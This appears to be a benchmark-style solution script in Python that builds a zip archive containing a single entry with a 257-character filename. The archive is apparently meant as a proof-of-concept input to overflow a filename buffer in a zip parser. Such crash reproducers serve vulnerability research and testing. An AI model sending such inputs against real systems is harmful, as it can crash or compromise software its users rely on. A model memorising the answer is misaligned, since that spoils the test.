import zipfile
from io import BytesIO

class Solution:
    def solve(self, src_path: str) -> bytes:
        buffer = BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            long_name = 'A' * 257
            zf.writestr(long_name, b'')
        return buffer.getvalue()